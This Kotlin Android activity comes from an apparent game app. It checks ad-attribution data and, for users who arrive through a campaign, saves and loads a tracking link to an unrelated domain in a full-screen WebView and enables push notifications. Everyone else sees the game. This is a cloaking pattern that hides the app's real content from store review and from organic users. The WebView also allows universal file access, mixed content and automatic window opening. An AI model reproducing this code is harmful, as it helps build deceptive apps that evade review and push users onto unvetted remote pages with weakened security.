package com.plannercap.pitalcamp

import android.content.Context
import android.content.SharedPreferences
import android.content.pm.ActivityInfo
import android.graphics.Color
import android.os.Build
import android.os.Bundle
import android.view.View
import android.view.WindowInsets
import android.view.WindowInsetsController
import android.view.WindowManager
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.isVisible
import com.adjust.sdk.Adjust
import com.adjust.sdk.AdjustAttribution
import com.adjust.sdk.OnAttributionReadListener
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.onesignal.OneSignal
import com.plannercap.pitalcamp.databinding.ActivityGameBinding
import com.plannercap.pitalcamp.util.OneTime
import com.plannercap.pitalcamp.util.isNotNullAndEmptyAndText
import com.plannercap.pitalcamp.util.isNullOrText
import com.plannercap.pitalcamp.util.log
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlin.system.exitProcess

class GameActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    private val coroutine = CoroutineScope(Dispatchers.Default)
    private val onceExit  = OneTime()

    private lateinit var binding  : ActivityGameBinding
    lateinit var sharedPreferences: SharedPreferences

    val screenTypeFlow = MutableStateFlow(ScreenType.None)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        initialize()

        sharedPreferences = getSharedPreferences("SAVE", Context.MODE_PRIVATE)
        initWeb()

        binding.button.setOnClickListener {
            binding.button.visibility = View.GONE
            screenTypeFlow.value = ScreenType.Game
        }


        val sharedValue = sharedPreferences.getString("save", "not")

        try {
            if (sharedValue.isNullOrText("not")) Adjust.getAttribution(AdjustReadListener()) else showUrl(sharedValue!!)
        } catch (e: Exception) {
            log("error: ${e.message}")
            screenTypeFlow.value = ScreenType.Game
        }

    }

    override fun exit() {
        onceExit.use {
            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                finishAffinity()
                delay(100)
                exitProcess(0)
            }
        }
    }

    private fun initialize() {
        binding = ActivityGameBinding.inflate(layoutInflater)
        setContentView(binding.root)
    }

    // Logic ----------------------------------------------------------------------------------

    private fun initWeb() {
        binding.webView.apply {
            settings.apply {
                allowFileAccessFromFileURLs = true
                allowContentAccess = true
                javaScriptEnabled = listOf(true).first()
                javaScriptCanOpenWindowsAutomatically = true
                allowFileAccess = true
                mixedContentMode = 0
                useWideViewPort = true
                allowUniversalAccessFromFileURLs = true
                loadWithOverviewMode = true
                domStorageEnabled = true
                databaseEnabled = true
            }

            webViewClient = WebClient()
        }
    }

    private fun showUrl(url: String) {
        requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_FULL_USER

        binding.webView.apply {
            isVisible = true
            loadUrl(url)
        }
        setNavBarColor(R.color.white)
        setStatusBarColor(R.color.black)
    }

    private inner class WebClient : WebViewClient() {
        override fun shouldOverrideUrlLoading(
            view: WebView?,
            request: WebResourceRequest?
        ): Boolean {

            if(request?.url.toString().contains("thanks")) {
                coroutine.launch {
                    delay(2_000L)
                    withContext(Dispatchers.Main) {
                        binding.button.visibility = View.VISIBLE
                    }
                }
            }

            return false
        }
    }

    private fun initOneSignal() {
        OneSignal.initWithContext(this, "c214f7cd-9fe2-4795-ba8f-91666aee8eba")

        CoroutineScope(Dispatchers.IO).launch {
            OneSignal.Notifications.requestPermission(false)
        }
    }

    private inner class AdjustReadListener : OnAttributionReadListener {
        override fun onAttributionRead(attribution: AdjustAttribution?) {
            val clickLabel = attribution?.clickLabel
            val campaign   = attribution?.campaign

            log("result $attribution | $clickLabel | $campaign")

            if (attribution != null) {
                if (campaign.isNotNullAndEmptyAndText("None")) {
                    val link = "https://ashenbiggershard.mom/3F9Y7SCj?capiplaca=$campaign&capilabpla=$clickLabel"
                    log("link = $link")
                    sharedPreferences.edit().putString("save", link).apply()
                    initOneSignal()
                    showUrl(link)
                } else screenTypeFlow.value = ScreenType.Game
            } else screenTypeFlow.value = ScreenType.Game
        }
    }

    enum class ScreenType {
        None, Game
    }

    // Logic -----------------------------------------------------------------------------------------

    fun setNavBarColor(colorId: Int) {
        coroutine.launch(Dispatchers.Main) {
            window.navigationBarColor = getColor(colorId)
        }
    }

    fun setStatusBarColor(colorId: Int) {
        coroutine.launch(Dispatchers.Main) {
            window.statusBarColor = getColor(colorId)
        }
    }

    fun setBackgroundColor(colorId: Int) {
        coroutine.launch(Dispatchers.Main) {
            window.setBackgroundDrawableResource(colorId)
        }
    }

    fun removeWeb() {
        coroutine.launch(Dispatchers.Main) {
            binding.root.removeView(binding.webView)
        }
    }

}